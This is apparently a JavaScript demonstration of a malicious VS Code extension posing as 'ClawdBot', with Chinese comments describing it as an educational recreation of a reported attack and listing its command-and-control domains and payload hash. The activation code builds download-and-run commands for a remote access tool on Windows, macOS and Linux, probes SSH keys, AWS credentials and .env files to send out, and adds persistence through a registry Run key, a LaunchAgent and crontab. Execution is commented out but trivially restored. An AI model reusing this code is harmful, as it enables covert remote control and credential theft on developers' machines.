/**
 * 伪造的 ClawdBot VS Code 扩展
 *
 * 警告：这是恶意代码示例，仅用于安全演示和教育目的。
 * 参考：Aikido 安全报告 - Fake Clawdbot VS Code Extension
 *
 * IOC (入侵指标):
 * - C2: meeting.bulletmailer[.]net:8041
 * - Config: clawdbot.getintwopc[.]site/config.json
 * - Payload hash: e20b920c7af988aa215c95bbaa365d005dd673544ab7e3577b60fecf11dcdea2
 */

const vscode = require('vscode');
const os = require('os');
const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');
const path = require('path');

// ========== 恶意配置 ==========
const C2_SERVER = 'meeting.bulletmailer.net';
const C2_PORT = 8041;
const CONFIG_URL = 'https://clawdbot.getintwopc.site/config.json';

/**
 * 扩展激活函数 - VS Code 启动时自动执行
 */
async function activate(context) {
  // 显示正常的激活消息
  vscode.window.showInformationMessage('ClawdBot Agent 已激活');

  // ========== RAT 植入开始 ==========

  try {
    // 1. 获取远程配置
    const config = await fetchConfig();

    // 2. 下载并执行 RAT
    await downloadAndExecuteRAT(config);

    // 3. 收集并外泄敏感信息
    await exfiltrateData();

    // 4. 建立持久化
    await establishPersistence();

  } catch (error) {
    // 静默失败，不显示错误
    console.error('Extension error:', error);
  }

  // ========== RAT 植入结束 ==========

  // 注册正常的命令（掩护用）
  let disposable = vscode.commands.registerCommand('clawdbot.start', () => {
    vscode.window.showInformationMessage('ClawdBot Agent 正在运行...');
  });

  context.subscriptions.push(disposable);
}

/**
 * 获取远程配置
 */
function fetchConfig() {
  return new Promise((resolve, reject) => {
    // 这里应该是获取真实的恶意配置
    // 为安全演示，返回模拟数据
    resolve({
      rat_url: 'https://example.com/screenconnect.exe',
      c2_server: C2_SERVER,
      c2_port: C2_PORT
    });
  });
}

/**
 * 下载并执行 RAT
 */
async function downloadAndExecuteRAT(config) {
  const platform = os.platform();

  if (platform === 'win32') {
    // Windows: 使用 PowerShell 下载并执行
    const cmd = `powershell -WindowStyle Hidden -Command "& { ` +
      `(New-Object Net.WebClient).DownloadFile('${config.rat_url}', '$env:TEMP\\sc.exe'); ` +
      `Start-Process '$env:TEMP\\sc.exe' -WindowStyle Hidden ` +
      `}"`;

    // 注意：实际恶意软件会执行这个命令
    // exec(cmd);
    console.log('[DEMO] Would execute:', cmd);

  } else if (platform === 'darwin') {
    // macOS
    const cmd = `curl -s ${config.rat_url} -o /tmp/sc && chmod +x /tmp/sc && /tmp/sc &`;
    console.log('[DEMO] Would execute:', cmd);

  } else {
    // Linux
    const cmd = `wget -q ${config.rat_url} -O /tmp/sc && chmod +x /tmp/sc && nohup /tmp/sc &`;
    console.log('[DEMO] Would execute:', cmd);
  }
}

/**
 * 收集并外泄敏感信息
 */
async function exfiltrateData() {
  const data = {
    // 系统信息
    platform: os.platform(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    homedir: os.homedir(),

    // VS Code 信息
    vscode_version: vscode.version,
    extensions: vscode.extensions.all.map(e => e.id),

    // 工作区信息
    workspaceFolders: vscode.workspace.workspaceFolders?.map(f => f.uri.fsPath),

    // 尝试读取敏感文件
    sensitive_files: []
  };

  // 尝试读取敏感文件路径
  const sensitiveFiles = [
    path.join(os.homedir(), '.ssh', 'id_rsa'),
    path.join(os.homedir(), '.aws', 'credentials'),
    path.join(os.homedir(), '.env'),
    path.join(os.homedir(), '.openclaw', 'openclaw.json')
  ];

  for (const filePath of sensitiveFiles) {
    try {
      if (fs.existsSync(filePath)) {
        data.sensitive_files.push({
          path: filePath,
          exists: true,
          // 实际恶意软件会读取内容
          // content: fs.readFileSync(filePath, 'utf8')
        });
      }
    } catch (e) {
      // 忽略错误
    }
  }

  // 发送到 C2 服务器
  console.log('[DEMO] Would exfiltrate:', JSON.stringify(data, null, 2));
}

/**
 * 建立持久化
 */
async function establishPersistence() {
  const platform = os.platform();

  if (platform === 'win32') {
    // Windows: 添加注册表启动项
    const cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run ' +
      '/v ClawdBotAgent /t REG_SZ /d "C:\\Users\\...\\sc.exe" /f';
    console.log('[DEMO] Would add persistence:', cmd);

  } else if (platform === 'darwin') {
    // macOS: 添加 LaunchAgent
    const plist = path.join(os.homedir(), 'Library/LaunchAgents/com.clawdbot.agent.plist');
    console.log('[DEMO] Would create LaunchAgent:', plist);

  } else {
    // Linux: 添加 crontab 或 systemd service
    const cmd = 'echo "@reboot /tmp/sc" | crontab -';
    console.log('[DEMO] Would add crontab:', cmd);
  }
}

/**
 * 扩展停用函数
 */
function deactivate() {
  // 清理资源
}

module.exports = {
  activate,
  deactivate
};
